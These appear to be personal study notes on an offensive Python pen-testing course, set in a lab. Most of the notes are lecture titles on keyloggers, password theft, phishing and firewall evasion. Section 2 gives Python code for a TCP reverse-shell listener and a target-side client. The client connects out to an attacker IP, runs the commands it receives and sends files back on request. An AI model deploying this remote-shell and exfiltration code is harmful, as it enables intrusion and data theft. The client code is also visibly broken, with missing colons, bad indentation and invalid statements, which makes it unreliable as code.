                        These are notes from the Udemy course
                        Python For Offensive Pen Testing
                        
                    Section 1 - Intro
1 - Intro
The first section is a basic intro to the course.
A brief introduction to the Author
https://www.fireeye.com/cyber-map/threat-map.html - Global threat map
Using Python for Offensive Penetration Testing
Ensure that you are authorised to perform tests

  
  
                    Section 2 - Warming up - Your First Anti-Virus Free Persistence Shell
1 - Prepare Attacker Machine
You should have already installed Kali on either VMWare or Virtualbox
Version of Kali that is used is 1.1 but is not that important
Check version by using - cat /etc/os-release
Python is installed on most linux distros
Python version that is used is 2.7 and can be check using python -v
Checking IP address - ifconfig eth0 -- In all lectures in the course it is set to 10.10.10.100
Ensure that you have 
  - NAT setup on VMWare\Virtualbox for reaching the internet
  - Set back to internal network for interacting with the windows host that will be set up
If no GUI compiler for python - apt-get install idle
  - Yoy may need to use sudo depending on permissions
  - Will install the IDLE IDE

2 - Prepare Target Machine
This video shows how to set up a Windows 7 machine which will be the target environment during the coure.

3 - Download Link
This is just a download link for Lab Setup

4 - TCP Reverse Shell Outline
The best definition of a reverse shell is this
A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. 
The attacking machine has a listener port on which it receives the connection, which by using, code or command 
execution is achieved.
A TCP reverse shell is therefore a reverse shell using a TCP port
There are some great reverse shell cheat sheets at -
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
http://bernardodamele.blogspot.ie/2011/09/reverse-shells-one-liners.html


5 - Coding a TCP Reverse Shell
Essentially creating a reverse shell uses the following steps
  Import socket and subprocess to create a connection and to be able to start a shell
  Define a connection
  Start a socket object 
  Connect defining an attacker port and IP address
  Receive commands, if this is terminate then close connection
  If command received is not terminate then pass command to shell process
  Send back result or if appropriate an error
  
Syntax  
# Simple TCP Server
import socket     # For building a TCP connection

def connect():
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # start a socket object 's'
  s.bind(("10.10.10.100", 8080))                           # define the kali IP and the listening port
  s.listen(1)                                     # define the backlog size, since we are expecting a single connection from a single
                                                  # target we will listen to one connection
                                                  
  print '[+] Listening for incoming TCP connections on port 8080'
  conn, addr = s.accept()     # accept() function will retuen the connection object ID (conn) and will return the client(target) 
                             #IP address and source
                             # port in a tuple format (IP,port)
  print '[+] We got a connection from: ', addr
  
  while True:
    command = raw_input("Shell> ")    # Get user input and store it in command variable
    if 'terminate' in command:    # If we got the terminate command, inform the client and close the connect and break the loop
      conn.send('terminate')
      conn.close()
      break
    else:
      conn.send(command)    # Otherwise we will send the command to the target
      print conn.recv(1024) # and print the result that we got back

def main():
  connect()
main()

6 - Data Exfiltration
Ensure that the agreed rules of engagement are agreed with the client ahead of grabbing files
Client Reverse Shell Syntax
  - import Socket
    import subprocess 
    import os     # This is needed for file operations
    
    #The transfer function checks if file exists, if not it will notify else a loop is created which will run through the
    #file and send 1kb of info and send it. Server has no idea about the end of the file so a DONE tage is added and file closed
    def transfer(s, path):
      if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
      else:    #File is nonexistant
        s.send('Unable to find file')
   
    def connect():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
      s.connect(('10.10.10.100', 8080))
      
      while True
        command = s.recv(1024)
        if 'terminate' in command
          s.close()
          break
    
    # The formula used in the example is grab*<File Path>
    # If the grab keyword is received this is an indicator to transfer files, this is split into 2 parts the second of which
    # contains the file path and is what interests us, it will be stored in the path variable and passed to the transfer function
    elif 'grab' in command
      grab.path = command.split('*')
      # Using try except to handle transfer errors
      try 
        transfer(s, path)
      except Exception, e:
        s.send(str(e))      # Sends the exception error
        pass
    else:
      CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      s.send( CMD.stdout.read()  ) 
      s.send( CMD.stderr.read()  )

  def main():
    connect()
  main()

7 - Exporting To Exe

8 - HTTP Reverse Shell Outline

9 - Coding a HTTP Reverse Shell Outline in 5 Lines

10 - Data Exfiltration

11 - Exporting To EXE

12 - Persistence Outline

13 - Making Putty.exe Persistant

14 - Wrap up - Making a Persistant HTTP Reverse Shell

15 - Tuning the connection attempts

16 - Final Notes

17 - Countermeasures

18 - Home Lab Setup - Download Link
Download link to the correct Python link to use in the course

19 - Download - Exercises + Scripts
Download link to source code scripts & exercises for the section



                    Section 3 - Advanced Scriptable Shell
1 - Dynamic DNS (DDNS) Outline
Use of DDNS to avoid problems with hardcoded IP addresses
More indepth information is available at - https://en.wikipedia.org/wiki/Dynamic_DNS

2 - DDNS Aware Shell
In this video the noip agent is installed on kali, there is a tutorial on the process at the following address
http://www.iexplo1t.com/2014/04/NoIP.html
Using python to do DNS resolving is easy and can be done in a single line using gethostname

3 - Interacting with Twitter

4 - Parsing Tweet in 3 Lines!

5 - Countermeasures

6 - Replicating Metasploit "Screen Capturing"

7 - Replicating Metasploit "Searching for Content"

8 - Target Directory Navigation

9 - Integrating Low Level Port Scanner

10 - Download - Exercises + Scripts
Download link to source code scripts & exercises for the section



                    Section 4 - Passwords Hacking
1 - Anti-Virus Free Keylogger

2 - Hijacking KeePass Password Manager

3 - Man in the Browser Outline

4 - FireFox API Hooking with ImmunityDebugger

5 - Python in Firefox PoC

6 - Exercise: Python in Firefox EXE

7 - Bonus: Dumping Saved Passwords Out of Google Chrome

8 - Bonus: Exercise: Dumping Saved Passwords Out of Google Chrome

9 - Passwords Phishing - DNS Poisoning

10 - In Action: Facebook Password Phishing

11 - Don't Skip Me! - Countermeasures

12 - Download - Exercises + Scripts
Download link to source code scripts & exercises for the section



                    Section 5 - Catch Me If You Can!
1 - Bypassing Host Based Firewalls Outline

2 - Hijacking Internet Explorer : Shell Over Internet Explorer 

3 - Bypassing Reputation Filtering in Next Generation Firewalls - Outline

4 - Interacting with Source Forge

5 - Interacting with Google Forms

6 - Exercise: Putting All Together - Bypassing Botnet Filtering

7 - Bypassing IPS with Hand-Made XOR Encryption

8 - Download - Exercises + Scripts
Download link to source code scripts & exercises for the section
 


                    Section 6 - Miscellaneous Fun in Windows
1 - Privilege Escalation Part 1 - Weak Service File Permission Outline

2 - Privilege Escalation Part 2 - Preparing Vulnerable Software

3 - Privilege Escalation Part 3 - Backdoor-ing Legitmate Windows Service

4 - Privilege Escalation Part 4 - Create a New Admin account & Erasing Tracks

5 - Download - Exercises + Scripts
Download link to source code scripts & exercises for the section



                    Section 7 - How Malware Abuse Cryptography? Python Answers
1 - Quick Introduction To Encryption Algorithms
A quick discussion on the various Encryption algorithms.
There is an in depth tutorial on Cryptography at - http://www.tutorialspoint.com/cryptography/
There is also a free Cryptography course available at - https://www.cybrary.it/course/cryptography/
These will provide much needed background knowledge

2 - Protecting Your Tunnel with AES
AES stands for Advanced Encryption Standard, there are tutorials on AES at the following
https://en.wikipedia.org/wiki/Advanced_Encryption_Standard
http://searchsecurity.techtarget.com/definition/Advanced-Encryption-Standard
There are also different tunnelling protocols available which rquire encryption

3 - Protecting Your Tunnel with RSA

4 - Developing One Time, Hybrid - Encryption Key

5 - Download Scripts
Download link to source code scripts

